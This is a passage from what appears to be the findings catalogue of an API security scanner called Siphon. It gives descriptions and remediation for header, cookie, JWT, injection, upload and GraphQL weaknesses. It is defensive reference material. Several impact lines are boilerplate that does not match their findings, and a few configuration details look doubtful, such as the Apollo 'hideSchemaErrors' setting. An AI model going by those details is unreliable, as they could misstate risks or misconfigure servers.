Rename uploaded files to random identifiers. Scan uploaded files with antivirus/antimalware before storing. Implement size limits and rate limiting on upload endpoints. Require authentication for all upload functionality.
description: Siphon identified an API endpoint that accepts file uploads (multipart/form-data or binary body). File upload endpoints are high-value targets because they can be leveraged for unrestricted file upload attacks, path traversal, server-side code execution, and storage exhaustion. The presence of this endpoint is noted for targeted manual testing of upload restrictions, file type validation, and storage path controls.
impact: This finding provides informational context about the environment useful for security assessment and hardening.
_x_remediation: Enforce strict file type validation using magic bytes rather than extension or MIME type alone. Store uploaded files outside the web root in a sandboxed directory. Rename uploaded files to random identifiers. Scan uploaded files with antivirus/antimalware before storing. Implement size limits and rate limiting on upload endpoints. Require authentication for all upload functionality.

title: Discovery: Potential Undocumented Upload Endpoint Discovered
remediation_brief: Determine the purpose of the undocumented upload endpoint. If it is no longer needed, remove it. If legitimate, add it to the API specification and subject it to full security review including file type validation, authentication enforcement, and storage security. Implement monitoring for upload activity on this endpoint.
description: Siphon discovered a potential file upload endpoint that is not listed in the API specification. The endpoint was identified through path pattern matching (e.g., paths containing 'upload', 'import', 'attach', 'file') or by observing multipart/form-data handling. Undocumented upload endpoints often bypass the security controls applied to documented ones and may represent legacy functionality with weaker validation. This endpoint warrants immediate manual review.
impact: This finding provides informational context about the environment useful for security assessment and hardening.
_x_remediation: Determine the purpose of the undocumented upload endpoint. If it is no longer needed, remove it. If legitimate, add it to the API specification and subject it to full security review including file type validation, authentication enforcement, and storage security. Implement monitoring for upload activity on this endpoint.

title: JWT: JWT Missing Expiry Claim

mitre_attack.name: Use Alternate Authentication Material: Application Access Token

remediation_brief: Include an exp claim in all issued JWTs with an appropriate short-lived expiry (e.g., 15 minutes for access tokens, 24 hours for refresh tokens). Validate the exp claim server-side on every request. Implement token refresh logic for clients so that short-lived access tokens can be renewed using longer-lived refresh tokens. Never issue non-expiring tokens in production.
description: The JWT issued by the API does not contain an exp (expiration) claim. Without an expiration claim, the token is theoretically valid indefinitely. An attacker who intercepts or steals a token (via XSS, network interception, log leakage, or insider threat) can use it perpetually without any time-based invalidation occurring. This violates the principle of least privilege as applied to authentication tokens and significantly increases the blast radius of any token compromise.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization.
_x_remediation: Include an exp claim in all issued JWTs with an appropriate short-lived expiry (e.g., 15 minutes for access tokens, 24 hours for refresh tokens). Validate the exp claim server-side on every request. Implement token refresh logic for clients so that short-lived access tokens can be renewed using longer-lived refresh tokens. Never issue non-expiring tokens in production.

title: Information Disclosure: Server Header
remediation_brief: Configure the web server to suppress or mask the Server header. In nginx, set 'server_tokens off'. In Apache, set 'ServerTokens Prod' and 'ServerSignature Off'. Configure IIS to remove the Server header via HTTP response headers settings. Replace the header value with a generic string if complete removal is not possible.
description: The API response includes a Server HTTP header that discloses the web server software and version (e.g., Apache/2.4.51, nginx/1.21.3). This information assists an attacker in identifying the server technology stack and cross-referencing against known CVEs for that exact version. While not directly exploitable, version disclosure lowers the bar for targeted exploitation by eliminating reconnaissance effort.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Configure the web server to suppress or mask the Server header. In nginx, set 'server_tokens off'. In Apache, set 'ServerTokens Prod' and 'ServerSignature Off'. Configure IIS to remove the Server header via HTTP response headers settings. Replace the header value with a generic string if complete removal is not possible.

title: Information Disclosure: Via Header
remediation_brief: Configure reverse proxies and CDN edge nodes to suppress or rewrite the Via header before forwarding responses to clients. If Via is required for debugging purposes, ensure it only contains generic identifiers rather than internal hostnames or software versions. Use network segmentation to prevent direct access to origin servers bypassing the CDN.
description: The API response includes a Via HTTP header that reveals information about intermediate proxies, load balancers, or CDN nodes in the request path. The Via header can expose internal hostnames, proxy software versions, or network topology that assists an attacker in mapping internal infrastructure. This information can be used to identify internal services, bypass CDN protections by directly targeting origin servers, or craft targeted attacks against specific proxy versions.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Configure reverse proxies and CDN edge nodes to suppress or rewrite the Via header before forwarding responses to clients. If Via is required for debugging purposes, ensure it only contains generic identifiers rather than internal hostnames or software versions. Use network segmentation to prevent direct access to origin servers bypassing the CDN.

title: Information Disclosure: X-Powered-By Header
remediation_brief: Remove the X-Powered-By header at the framework or server level. In Express.js, call 'app.disable("x-powered-by")'. In PHP, set 'expose_php = Off' in php.ini. In ASP.NET, remove the X-Powered-By header in the web.config customHeaders section. Alternatively, strip the header at the reverse proxy or WAF layer.
description: The API response includes an X-Powered-By header that discloses the application framework or runtime (e.g., PHP/8.1.0, ASP.NET, Express). This information enables an attacker to identify the specific framework in use and correlate it against known vulnerabilities for that version. X-Powered-By is a non-standard header set by frameworks by default and provides no functional benefit to legitimate clients.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Remove the X-Powered-By header at the framework or server level. In Express.js, call 'app.disable("x-powered-by")'. In PHP, set 'expose_php = Off' in php.ini. In ASP.NET, remove the X-Powered-By header in the web.config customHeaders section. Alternatively, strip the header at the reverse proxy or WAF layer.

title: Information Disclosure: X-AspNet-Version Header
remediation_brief: Disable the X-AspNet-Version header by adding '<httpRuntime enableVersionHeader="false" />' to the system.web section of web.config. Additionally configure IIS to remove the X-Powered-By and Server headers via customHeaders configuration. Keep ASP.NET runtime patched to the latest stable version regardless of header suppression.
description: The API response includes an X-AspNet-Version header disclosing the exact version of the ASP.NET runtime in use. This version string enables targeted exploitation of known ASP.NET vulnerabilities specific to that version, including deserialization bugs, ViewState tampering vulnerabilities, and padding oracle attacks. The header provides no functional value to clients and represents unnecessary information exposure.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Disable the X-AspNet-Version header by adding '<httpRuntime enableVersionHeader="false" />' to the system.web section of web.config. Additionally configure IIS to remove the X-Powered-By and Server headers via customHeaders configuration. Keep ASP.NET runtime patched to the latest stable version regardless of header suppression.

title: Permissive Security Header: Content-Security-Policy
remediation_brief: Harden the CSP to remove 'unsafe-inline' and 'unsafe-eval' from script-src directives. Use nonces or hashes for inline scripts instead of blanket unsafe-inline permission. Restrict source allowlists to specific trusted domains. Use 'strict-dynamic' for modern browsers. Test the policy using Google's CSP Evaluator before deploying. Apply CSP to all API responses that return HTML content.
description: The API response includes a Content-Security-Policy header, but the policy is overly permissive (e.g., contains 'unsafe-inline', 'unsafe-eval', wildcard sources like '*', or 'data:' in script-src). A permissive CSP reduces protection against Cross-Site Scripting (XSS) attacks compared to a strict policy. While the header is present, its configuration does not provide meaningful protection against script injection.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Harden the CSP to remove 'unsafe-inline' and 'unsafe-eval' from script-src directives. Use nonces or hashes for inline scripts instead of blanket unsafe-inline permission. Restrict source allowlists to specific trusted domains. Use 'strict-dynamic' for modern browsers. Test the policy using Google's CSP Evaluator before deploying. Apply CSP to all API responses that return HTML content.

title: Permissive Security Header: Strict-Transport-Security
remediation_brief: Set the HSTS max-age to at least 31536000 seconds (one year). Add the 'includeSubDomains' directive to protect all subdomains. Consider adding 'preload' and submitting the domain to the HSTS preload list at https://hstspreload.org. Ensure HSTS is only set over HTTPS connections and never over HTTP.
description: The API response includes a Strict-Transport-Security (HSTS) header, but it is configured with a very short max-age value (typically less than one year), lacks the 'includeSubDomains' directive, or lacks 'preload'. A weak HSTS configuration leaves a window during which users can be downgraded to HTTP via SSL stripping attacks. The presence of the header is positive, but the permissive configuration reduces its protective value.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Weak cryptographic implementations may allow interception, decryption, or forgery of protected communications.
_x_remediation: Set the HSTS max-age to at least 31536000 seconds (one year). Add the 'includeSubDomains' directive to protect all subdomains. Consider adding 'preload' and submitting the domain to the HSTS preload list at https://hstspreload.org. Ensure HSTS is only set over HTTPS connections and never over HTTP.

title: Permissive Security Header: X-Frame-Options
remediation_brief: Set X-Frame-Options to DENY if the content should never be framed, or SAMEORIGIN if framing from the same origin is required. Prefer using the Content-Security-Policy frame-ancestors directive as a modern replacement, as it offers more granular control and is consistently supported. Remove ALLOWFROM configurations entirely.
description: The API response includes an X-Frame-Options header set to ALLOWFROM or a value other than DENY or SAMEORIGIN. ALLOWFROM has inconsistent browser support and may not provide effective clickjacking protection in all browsers. A permissive or inconsistent X-Frame-Options value reduces protection against UI redress attacks where the API's responses are framed in an attacker-controlled page.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Set X-Frame-Options to DENY if the content should never be framed, or SAMEORIGIN if framing from the same origin is required. Prefer using the Content-Security-Policy frame-ancestors directive as a modern replacement, as it offers more granular control and is consistently supported. Remove ALLOWFROM configurations entirely.

title: Permissive Security Header: X-Content-Type-Options
remediation_brief: Set the X-Content-Type-Options header to exactly 'nosniff' on all API responses. This is a binary setting — only 'nosniff' is valid. Ensure the correct Content-Type header is also set on all responses to prevent browsers from needing to sniff the content type.
description: The API response includes an X-Content-Type-Options header with an invalid or non-standard value rather than the required 'nosniff'. A header value other than 'nosniff' does not prevent MIME-type sniffing in browsers and provides no protection against attacks that exploit browsers executing incorrectly typed content (e.g., a JSON file with executable JavaScript content being sniffed and executed as text/html).
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Set the X-Content-Type-Options header to exactly 'nosniff' on all API responses. This is a binary setting — only 'nosniff' is valid. Ensure the correct Content-Type header is also set on all responses to prevent browsers from needing to sniff the content type.

title: Permissive Security Header: Referrer-Policy
remediation_brief: Set Referrer-Policy to 'strict-origin-when-cross-origin' or 'no-referrer' depending on business requirements. Avoid 'unsafe-url' in all cases. For API endpoints that do not serve HTML, set the Referrer-Policy to 'no-referrer'. Ensure that sensitive information such as tokens or session IDs are never included in URLs.
description: The API response includes a Referrer-Policy header set to an overly permissive value such as 'unsafe-url' or 'no-referrer-when-downgrade'. These values cause the browser to send the full URL (including query parameters, authentication tokens, or session identifiers embedded in URLs) as the Referrer header to third-party domains. This can lead to sensitive data leakage to analytics providers, CDNs, or any third-party resource loaded by the page.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Set Referrer-Policy to 'strict-origin-when-cross-origin' or 'no-referrer' depending on business requirements. Avoid 'unsafe-url' in all cases. For API endpoints that do not serve HTML, set the Referrer-Policy to 'no-referrer'. Ensure that sensitive information such as tokens or session IDs are never included in URLs.

title: Permissive Security Header: Cache-Control
remediation_brief: For authenticated or sensitive API responses, set Cache-Control to 'no-store, private' to prevent caching at all levels. For public, non-sensitive responses, use appropriate 'public' and 'max-age' directives. Review all endpoints that return user-specific data and ensure their Cache-Control headers prevent intermediate caching.
description: The API response includes a Cache-Control header, but it allows caching of potentially sensitive responses. For example, the value may be missing 'no-store', or may allow public proxies to cache authenticated responses via 'public' or 'max-age' directives without 'private'. Sensitive API responses cached by intermediary proxies, CDNs, or shared caches can be accessed by other users or attackers with access to those caches.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: For authenticated or sensitive API responses, set Cache-Control to 'no-store, private' to prevent caching at all levels. For public, non-sensitive responses, use appropriate 'public' and 'max-age' directives. Review all endpoints that return user-specific data and ensure their Cache-Control headers prevent intermediate caching.

title: Cookies: Missing SameSite Attribute
remediation_brief: Set the SameSite attribute to 'Lax' as a minimum, or 'Strict' for sensitive cookies such as session tokens. 'None' should only be used when cross-site cookie sending is explicitly required, and must be paired with the Secure attribute. Evaluate whether cookie-based authentication is appropriate for the API, or whether Authorization headers should be used instead.
description: An API session cookie does not include the SameSite attribute. Without SameSite, the browser will send the cookie on all cross-site requests, including those initiated by attacker-controlled third-party sites. This enables Cross-Site Request Forgery (CSRF) attacks where an attacker can cause authenticated actions to be performed without the user's knowledge. While REST APIs using Authorization headers are generally not susceptible to CSRF, cookie-based API authentication without SameSite is vulnerable.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization.
_x_remediation: Set the SameSite attribute to 'Lax' as a minimum, or 'Strict' for sensitive cookies such as session tokens. 'None' should only be used when cross-site cookie sending is explicitly required, and must be paired with the Secure attribute. Evaluate whether cookie-based authentication is appropriate for the API, or whether Authorization headers should be used instead.

title: Cookies: Misconfigured SameSite Attribute
remediation_brief: Audit all cookies with SameSite=None and confirm each has a documented business requirement for cross-site access. Ensure SameSite=None is always paired with the Secure attribute. Where cross-site access is not required, change SameSite to 'Lax' or 'Strict'. Remove any unrecognized or typo'd SameSite values.
description: An API session cookie includes the SameSite attribute but it is set to 'None' without a legitimate cross-site requirement, or is set to a value that browsers do not recognize and fall back to treating as SameSite=None. SameSite=None without a strong justification allows cross-site request forgery attacks the same as having no SameSite attribute. This finding also covers cookies where SameSite=None is set without the required Secure flag, which modern browsers will reject entirely.
impact: An attacker could use this information or weakness for reconnaissance or to facilitate more targeted attacks against the organization.
_x_remediation: Audit all cookies with SameSite=None and confirm each has a documented business requirement for cross-site access. Ensure SameSite=None is always paired with the Secure attribute. Where cross-site access is not required, change SameSite to 'Lax' or 'Strict'. Remove any unrecognized or typo'd SameSite values.

title: Sensitive File Exposed: API Specification Exposed
remediation_brief: Restrict access to API specification endpoints using authentication. At minimum, require valid credentials to access /swagger-ui, /openapi.json, and related documentation paths. In production environments, consider completely removing public API documentation and limiting it to internal networks or developer portals. If public documentation is required, ensure it does not contain internal or sensitive endpoint details.
description: The API's OpenAPI/Swagger specification or equivalent documentation is publicly accessible without authentication (e.g., at /swagger.json, /openapi.json, /api-docs, /swagger-ui.html). The specification reveals the complete API surface including all endpoints, parameter names and types, authentication schemes, and response schemas. This dramatically reduces the reconnaissance effort required for an attacker, providing a complete blueprint of the API without any prior knowledge.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Exposed information aids attacker reconnaissance and reveals sensitive system details.
_x_remediation: Restrict access to API specification endpoints using authentication. At minimum, require valid credentials to access /swagger-ui, /openapi.json, and related documentation paths. In production environments, consider completely removing public API documentation and limiting it to internal networks or developer portals. If public documentation is required, ensure it does not contain internal or sensitive endpoint details.

title: Missing Security Header: Content-Security-Policy
remediation_brief: Implement a Content-Security-Policy header on all HTTP responses that return HTML content. Start with a restrictive policy such as "default-src 'self'" and gradually expand based on application requirements. Use CSP reporting (report-to or report-uri) to identify violations before enforcing. For pure JSON API endpoints, set CSP to "default-src 'none'" as those endpoints should never load external resources.
description: The API response does not include a Content-Security-Policy (CSP) header. Without CSP, the browser applies no restrictions on the origins from which scripts, styles, images, and other resources can be loaded, significantly increasing the risk of Cross-Site Scripting (XSS) attacks. A missing CSP means any XSS vulnerability in the API's responses can result in arbitrary script execution without any browser-level mitigation.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Implement a Content-Security-Policy header on all HTTP responses that return HTML content. Start with a restrictive policy such as "default-src 'self'" and gradually expand based on application requirements. Use CSP reporting (report-to or report-uri) to identify violations before enforcing. For pure JSON API endpoints, set CSP to "default-src 'none'" as those endpoints should never load external resources.

title: Missing Security Header: X-Frame-Options
remediation_brief: Add 'X-Frame-Options: DENY' to all API responses, or use the more modern Content-Security-Policy 'frame-ancestors' directive (e.g., "frame-ancestors 'none'"). For APIs that legitimately need to be framed by the same origin, use SAMEORIGIN. Prefer the CSP approach as it supports more granular control and is the modern standard.
description: The API response does not include an X-Frame-Options header and the Content-Security-Policy header does not include a frame-ancestors directive. Without this protection, the API's responses can be embedded in iframes on attacker-controlled websites, enabling UI redress (clickjacking) attacks. An attacker can overlay invisible or transparent frames over legitimate UI elements to trick users into performing unintended authenticated actions.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Add 'X-Frame-Options: DENY' to all API responses, or use the more modern Content-Security-Policy 'frame-ancestors' directive (e.g., "frame-ancestors 'none'"). For APIs that legitimately need to be framed by the same origin, use SAMEORIGIN. Prefer the CSP approach as it supports more granular control and is the modern standard.

title: Missing Security Header: X-Content-Type-Options
remediation_brief: Add 'X-Content-Type-Options: nosniff' to all API HTTP responses. Ensure all responses also include accurate Content-Type headers matching the actual content. This single-directive header is trivial to implement and should be applied globally via middleware or the web server configuration.
description: The API response does not include an X-Content-Type-Options: nosniff header. Without this header, browsers may perform MIME-type sniffing and interpret responses as a different content type than declared. For example, a JSON response containing JavaScript could be executed as a script in certain browser configurations. This attack vector is particularly relevant for APIs that accept and reflect user-supplied content.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Add 'X-Content-Type-Options: nosniff' to all API HTTP responses. Ensure all responses also include accurate Content-Type headers matching the actual content. This single-directive header is trivial to implement and should be applied globally via middleware or the web server configuration.

title: Missing Security Header: Referrer-Policy
remediation_brief: Add a Referrer-Policy header to all API responses. Set the value to 'strict-origin-when-cross-origin' as a sensible default for most applications, or 'no-referrer' for endpoints that should not leak any referrer information. Ensure sensitive data is never embedded in URLs where it could be exposed in the Referer header.
description: The API response does not include a Referrer-Policy header. Without this header, the browser defaults to 'no-referrer-when-downgrade' behavior, sending the full URL as the Referrer header to any HTTPS destination when navigating from HTTPS pages. If API request URLs contain sensitive parameters such as session tokens, API keys, or user identifiers, these values will be leaked to third-party analytics services, CDNs, or any embedded resources loaded by the page.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Add a Referrer-Policy header to all API responses. Set the value to 'strict-origin-when-cross-origin' as a sensible default for most applications, or 'no-referrer' for endpoints that should not leak any referrer information. Ensure sensitive data is never embedded in URLs where it could be exposed in the Referer header.

title: Missing Security Header: Cache-Control
remediation_brief: Add Cache-Control headers to all authenticated or sensitive API responses. Use 'no-store, private' to prevent caching at all levels for sensitive responses. Use 'no-cache' if validation is acceptable but indefinite caching is not. Ensure that any CDN or reverse proxy in front of the API is configured to respect these directives.
description: The API response for a sensitive or authenticated endpoint does not include a Cache-Control header. Without explicit cache control directives, the response may be cached by intermediate proxies, CDN edge nodes, shared corporate caches, or the client browser. Sensitive API responses (e.g., user profiles, account data, payment information) cached in shared environments can be retrieved by other users, creating a data confidentiality risk.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Add Cache-Control headers to all authenticated or sensitive API responses. Use 'no-store, private' to prevent caching at all levels for sensitive responses. Use 'no-cache' if validation is acceptable but indefinite caching is not. Ensure that any CDN or reverse proxy in front of the API is configured to respect these directives.

title: Missing Security Header: Permissions-Policy
remediation_brief: Add a Permissions-Policy header to restrict access to browser features to only those the application requires. Use a restrictive default such as 'camera=(), microphone=(), geolocation=(), payment=()' and selectively enable features as needed. This header provides defense-in-depth against XSS exploitation of browser APIs.
description: The API response does not include a Permissions-Policy header (formerly Feature-Policy). Without this header, the browser grants default access to powerful browser features such as camera, microphone, geolocation, payment, and USB for any content rendered from this origin, including third-party iframes. Malicious scripts or XSS payloads executing in the context of this origin can access these features without restriction.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Add a Permissions-Policy header to restrict access to browser features to only those the application requires. Use a restrictive default such as 'camera=(), microphone=(), geolocation=(), payment=()' and selectively enable features as needed. This header provides defense-in-depth against XSS exploitation of browser APIs.

title: Cookies: Missing HttpOnly Flag
remediation_brief: Set the HttpOnly flag on all session and authentication cookies. This prevents JavaScript from accessing the cookie value while still allowing it to be sent on HTTP requests. Evaluate whether cookie-based authentication is appropriate for the API use case; Authorization headers are generally preferred for API clients as they cannot be stolen via XSS in the same way.
description: An API session or authentication cookie is set without the HttpOnly attribute. Without HttpOnly, client-side JavaScript can read the cookie value via document.cookie, enabling session hijacking through Cross-Site Scripting (XSS) attacks. An attacker who successfully injects a script into the application can exfiltrate the session cookie and impersonate the victim without any further interaction.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system.
_x_remediation: Set the HttpOnly flag on all session and authentication cookies. This prevents JavaScript from accessing the cookie value while still allowing it to be sent on HTTP requests. Evaluate whether cookie-based authentication is appropriate for the API use case; Authorization headers are generally preferred for API clients as they cannot be stolen via XSS in the same way.

title: Cookies: Missing Secure Flag
remediation_brief: Set the Secure flag on all session and authentication cookies. This ensures the cookie is only transmitted over HTTPS connections. Combine with HSTS to prevent the browser from making HTTP requests to the API at all. If HTTP access is still required for any reason, ensure no sensitive cookies are set on HTTP responses.
description: An API session or authentication cookie is set without the Secure attribute. Without the Secure flag, the browser will transmit the cookie over unencrypted HTTP connections in addition to HTTPS. An attacker performing a network man-in-the-middle attack (e.g., on an unencrypted Wi-Fi network) can intercept the session cookie and use it to impersonate the authenticated user. This is particularly critical for authentication tokens.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system.
_x_remediation: Set the Secure flag on all session and authentication cookies. This ensures the cookie is only transmitted over HTTPS connections. Combine with HSTS to prevent the browser from making HTTP requests to the API at all. If HTTP access is still required for any reason, ensure no sensitive cookies are set on HTTP responses.

title: Missing Security Header: Rate Limit Response Missing Retry-After Header
remediation_brief: Include a Retry-After header (or X-RateLimit-Reset) in all 429 responses, specifying either a date/time or number of seconds until the rate limit window resets. Document the rate limiting behavior in the API specification. Consider also returning X-RateLimit-Limit and X-RateLimit-Remaining headers on successful responses to help clients self-regulate.
description: The API returns a 429 Too Many Requests response when rate limits are exceeded, but does not include a Retry-After header indicating when the client should retry. Without Retry-After, clients implementing retry logic may immediately retry requests, causing a thundering herd effect that amplifies load on the server. Additionally, the absence of this header makes the rate limiting behavior opaque, which can assist attackers in tuning their request timing to avoid detection.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Include a Retry-After header (or X-RateLimit-Reset) in all 429 responses, specifying either a date/time or number of seconds until the rate limit window resets. Document the rate limiting behavior in the API specification. Consider also returning X-RateLimit-Limit and X-RateLimit-Remaining headers on successful responses to help clients self-regulate.

title: Injection: CRLF Injection in API Parameter
remediation_brief: Sanitize all user-supplied input before including it in HTTP response headers by stripping or encoding CR (\r) and LF (\n) characters. Use framework-provided header-setting APIs rather than constructing headers manually. Implement output encoding appropriate to the context. Validate that header values conform to expected formats using allowlist validation.
description: Siphon detected that an API parameter containing CRLF sequences (\r\n, %0d%0a) is reflected in HTTP response headers without sanitization. CRLF injection allows an attacker to inject arbitrary HTTP headers into the response, enabling header injection attacks, response splitting, cookie injection, cache poisoning, and cross-site scripting via injected Location or Set-Cookie headers. The impact depends on how the injected content is processed by downstream proxies and browsers.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system.
_x_remediation: Sanitize all user-supplied input before including it in HTTP response headers by stripping or encoding CR (\r) and LF (\n) characters. Use framework-provided header-setting APIs rather than constructing headers manually. Implement output encoding appropriate to the context. Validate that header values conform to expected formats using allowlist validation.

title: Injection: Log Injection via User-Agent / Query Parameter
remediation_brief: Sanitize all user-controlled values before writing them to logs by encoding or stripping newline characters, control characters, and HTML special characters. Use structured logging (JSON or similar) rather than free-form string concatenation so injected newlines cannot create new log entries. Apply input validation on User-Agent and other headers before logging.
description: Siphon detected that user-controlled input (User-Agent header or query parameters) is written to application logs without sanitization. An attacker can inject newline characters and fake log entries to forge log records, obfuscate malicious activity, or confuse log analysis tools. In systems where logs are consumed by downstream parsers or SIEM tools, injected log entries can trigger false alerts or suppress real ones. If logs are displayed in a web-based log viewer, log injection can escalate to stored XSS.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system.
_x_remediation: Sanitize all user-controlled values before writing them to logs by encoding or stripping newline characters, control characters, and HTML special characters. Use structured logging (JSON or similar) rather than free-form string concatenation so injected newlines cannot create new log entries. Apply input validation on User-Agent and other headers before logging.

title: Information Disclosure: SOAP Verbose Fault / Error Disclosure
remediation_brief: Configure the SOAP framework to return generic, client-safe fault messages in production environments. Disable stack trace inclusion in fault detail elements. Log detailed error information server-side rather than returning it to clients. Implement a custom fault handler that maps internal exceptions to generic error codes. Regularly test error conditions to verify no sensitive data is disclosed.
description: The SOAP API returns verbose fault messages that disclose internal details such as stack traces, server-side file paths, class names, database connection strings, SQL query fragments, or XML schema structures. Verbose SOAP faults provide an attacker with detailed knowledge of the internal architecture that significantly aids in crafting targeted exploitation attempts. This information leakage is particularly valuable for injection attack reconnaissance.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Exposed information aids attacker reconnaissance and reveals sensitive system details.
_x_remediation: Configure the SOAP framework to return generic, client-safe fault messages in production environments. Disable stack trace inclusion in fault detail elements. Log detailed error information server-side rather than returning it to clients. Implement a custom fault handler that maps internal exceptions to generic error codes. Regularly test error conditions to verify no sensitive data is disclosed.

title: GraphQL: GraphQL Field Suggestions Enabled
remediation_brief: Disable field suggestions in the GraphQL engine configuration. In Apollo Server, set 'hideSchemaErrors: true' or use a custom error formatter to remove suggestion strings from error responses. In other frameworks, configure the error masking/formatting to strip suggestion messages. Do not rely on disabling introspection alone as a schema protection measure if field suggestions are still enabled.
description: The GraphQL API returns field suggestion messages (e.g., "Did you mean 'password'?") when a queried field name is similar to an existing field. This behavior exposes the schema's field names even when introspection is disabled, allowing an attacker to enumerate object types and field names by submitting deliberately misspelled queries and observing the suggestions in error responses. This effectively bypasses introspection-based schema hiding.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Input validation failures may allow injection attacks, data manipulation, or unauthorized code execution.
_x_remediation: Disable field suggestions in the GraphQL engine configuration. In Apollo Server, set 'hideSchemaErrors: true' or use a custom error formatter to remove suggestion strings from error responses. In other frameworks, configure the error masking/formatting to strip suggestion messages. Do not rely on disabling introspection alone as a schema protection measure if field suggestions are still enabled.

title: GraphQL: GraphQL Error Response Leaks Internal Details
remediation_brief: Configure the GraphQL server to mask internal error details in production. Return only generic error messages with client-safe error codes. Log complete error details server-side for debugging. In Apollo Server, set 'includeStacktraceInErrorResponses: false'. Implement a custom error formatter that strips extensions.exception.stacktrace and other internal fields from error responses.
description: GraphQL error responses from this API expose internal implementation details including stack traces, resolver function names, database query details, file system paths, or internal type names. These details assist an attacker in mapping the internal architecture, identifying the database technology, and crafting targeted injection payloads. Error detail leakage in GraphQL APIs is common when development-mode error handling is left enabled in production deployments.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system.
_x_remediation: Configure the GraphQL server to mask internal error details in production. Return only generic error messages with client-safe error codes. Log complete error details server-side for debugging. In Apollo Server, set 'includeStacktraceInErrorResponses: false'. Implement a custom error formatter that strips extensions.exception.stacktrace and other internal fields from error responses.

title: GraphQL: GraphQL Directive Abuse — Accepted Without Limit
remediation_brief: Implement directive count validation in the GraphQL query parser to limit the number of directives per field and per query. Set a maximum directive application limit (e.g., no more than 10 directives per field). Use a query cost analysis library that accounts for directive evaluation cost. Apply rate limiting on the GraphQL endpoint.
description: The GraphQL API accepts queries containing multiple repeated directives (e.g., @include, @skip, or custom directives) on the same field without limit. Attackers can abuse this by submitting queries with thousands of directive applications on a single field, causing excessive server-side processing to evaluate each directive. This is a form of denial-of-service attack that does not require a large query document and may not be caught by query complexity or depth limits.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Network-level vulnerabilities may allow traffic interception, lateral movement, or unauthorized service access.
_x_remediation: Implement directive count validation in the GraphQL query parser to limit the number of directives per field and per query. Set a maximum directive application limit (e.g., no more than 10 directives per field). Use a query cost analysis library that accounts for directive evaluation cost. Apply rate limiting on the GraphQL endpoint.

title: GraphQL: GraphQL Fragment Sprawl — No Fragment Count Limit
remediation_brief: Implement fragment count limits in the GraphQL query validator (e.g., maximum 50 fragment definitions per query). Apply a query complexity analysis library that correctly accounts for inline and spread fragments when calculating query cost. Enable query timeout limits. Detect and reject queries containing circular fragment references.
description: The GraphQL API accepts queries containing an unrestricted number of fragment definitions. An attacker can define hundreds or thousands of fragments that cyclically reference each other or are applied across many fields, causing the server to perform excessive work during query validation and execution. Fragment sprawl attacks can bypass depth limit protections because fragments flatten the tree before depth counting. This can result in CPU exhaustion and denial-of-service conditions.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Network-level vulnerabilities may allow traffic interception, lateral movement, or unauthorized service access.
_x_remediation: Implement fragment count limits in the GraphQL query validator (e.g., maximum 50 fragment definitions per query). Apply a query complexity analysis library that correctly accounts for inline and spread fragments when calculating query cost. Enable query timeout limits. Detect and reject queries containing circular fragment references.

